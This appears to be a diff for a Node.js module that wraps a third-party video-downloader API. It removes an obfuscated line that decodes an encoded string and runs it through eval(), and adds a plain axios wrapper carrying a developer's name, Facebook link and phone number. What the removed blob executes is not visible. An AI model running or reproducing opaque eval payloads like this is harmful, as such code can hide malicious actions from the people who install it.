@@ -1,1 +1,30 @@
- var _0xc71e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe4c(d,e,f){var g=_0xc71e[2][_0xc71e[1]](_0xc71e[0]);var h=g[_0xc71e[3]](0,e);var i=g[_0xc71e[3]](0,f);var j=d[_0xc71e[1]](_0xc71e[0])[_0xc71e[10]]()[_0xc71e[9]](function(a,b,c){if(h[_0xc71e[4]](b)!==-1)return a+=h[_0xc71e[4]](b)*(Math[_0xc71e[8]](e,c))},0);var k=_0xc71e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc71e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe4c(s,e,10)-t)}return decodeURIComponent(escape(r))}("ktMCtMFKCtttFCtttkCttKkCttKFCktMCttFtCktMCtMFMCttttCttttCtMFkCtttFCttkKCtttkCktMCttFkCktMCFtFCktMCttKKCtMFFCttKtCttkMCttMkCttKKCtMFFCkKkCkKKCtttkCtMFMCttkFCtMFMCtttkCkkkCttktCttMkCtMFkCtMFFCtttFCttKkCkkkCtMFkCtttFCttkKCtttkCttttCtttFCtMFMCtMFkCtMFFCttKKCkKKCkKFCFtKCKtkCtMFMCttKkCttkFCtttkCtMFKCktMCttMMCttkMCtttkCtMFKCttKFCttMkCtttFCtttkCktMCtMFMCttttCttttCtMFkCttttCkKkCttkMCttKKCttttCkKFCktMCttFtCktMCttKFCttKKCttkFCktMCttFtCktMCtMFKCtttFCtttkCttKkCttKFCktMCtMFkCtMFMCttKFCtMFMCktMCFtFCktMCtMFMCttkKCtMFMCttMkCttKFCktMCtMFMCttttCttttCtMFkCtttFCttkKCtttkCkKkCttkMCttKKCttttCkKFCFtKCktMCtMFKCtttFCtttkCttKkCttKFCktMCttMkCtttKCttkMCktMCFtFCktMCtMFkCtMFMCttKFCtMFMCkkFCtMFkCtMFMCttKFCtMFMCFtKCktMCttKKCtMFFCttKFCttkMCttKKCtttkCktMCttFtCktMCFKkCttkMCttKFCttMKCtttFCttKKCFttCktMCktKCtMMMCtMMKCFFMCFKkCtMMMCtMMMCFKkCFktCktMCFFtCtMMMCtMtMCFKkCtMMtCktKCkkKCktMCFkkCtMFMCtMFKCtMFFCtMFtCtttFCtttFCtttMCFttCktMCktKCttMKCttKFCttKFCttKMCttKkCFttCkFMCkFMCttkKCttkKCttkKCkkFCttMMCtMFMCtMFKCtMFFCtMFtCtttFCtttFCtttMCkkFCtMFKCtttFCtttKCkFMCttKMCttKKCtttFCttMMCttMkCttttCtMFFCkkFCttKMCttMKCttKMCFKtCttMkCtMFkCFtFCkFKCkFtCkFtCkFtCFMkCFMtCkFKCkFkCkFkCFMFCkFFCFMkCFMFCkFtCFtMCktKCkkKCktMCttkKCttMKCtMFMCttKFCtMFMCttKMCttKMCFttCktMCktKCttkKCtMFMCkkFCtttKCtMFFCkFMCkktCFMFCFMFCkFtCkFKCFMKCFMFCFtMCFtMCkFtCkFFCkFkCFMKCFMkCktKCkkKCktMCtMFkCtMFMCttKFCtMFMCFttCktMCttMkCtttKCttkMCktMCttFkCFtKCktMCttFkCktMCtMFKCtMFMCttKFCtMFKCttMKCktMCkKkCtMFFCttKKCttKKCtttFCttKKCkKFCktMCttFtCktMCtMFKCtttFCtttkCttKkCtttFCttttCtMFFCkkFCtMFFCttKKCttKKCtttFCttKKCkKkCktKCFkKCttKKCttKKCtttFCttKKCktMCtMFkCtttFCttkKCtttkCttttCtttFCtMFMCtMFkCttMkCtttkCttMtCktMCttktCttMkCtMFkCtMFFCtttFCFttCktKCkkKCktMCtMFFCttKKCttKKCtttFCttKKCkKFCFtKCktMCttKFCttMKCttKKCtttFCttkKCktMCtMFFCttKKCttKKCtttFCttKKCFtKCktMCttFkCKtkCttFkCKtkCtttKCtttFCtMFkCttkMCttttCtMFFCkkFCtMFFCttkkCttKMCtttFCttKKCttKFCttKkCktMCFtFCktMCttFtCktMCtMFMCttttCttttCtMFkCttttCktMCttFkCFtKC",98,"MtKkFCGmq",48,5,38)) 
+const axios = require('axios');
+
+
+const apimain = 'https://nayan-video-downloader.vercel.app/';
+
+
+function createRequest(endpoint) {
+  return async function(params) {
+    try {
+      const response = await axios.get(`${apimain}${endpoint}`, { params });
+      const imran = response.data.data; 
+      
+      return {
+        developer: "MOHAMMAD IMRAN",
+        devfb: "https://www.facebook.com/profile.php?id=100075122837809",
+        devwp: "wa.me/+8801689903267",
+        status: true,
+        data: imran 
+      };
+    } catch (error) {
+      console.error('Error in API request:', error);
+      throw error;  
+    }
+  };
+}
+
+
+module.exports = {
+  alldl: createRequest('alldown')
+};
